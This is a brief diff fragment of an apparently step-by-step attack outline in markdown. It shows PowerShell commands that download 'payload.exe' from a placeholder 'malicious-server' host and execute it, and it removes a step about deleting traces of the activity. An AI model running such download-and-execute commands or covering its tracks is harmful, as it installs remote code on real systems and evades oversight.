@@ -9,7 +9,6 @@
    - Example command: `Invoke-WebRequest -Uri http://malicious-server/payload.exe -OutFile "payload.exe"`
 4. Execute the downloaded payload.
    - Example: `Start-Process -FilePath "payload.exe"`
-5. Delete any traces of the activity, including removing the downloaded payload.
 
 ---
 
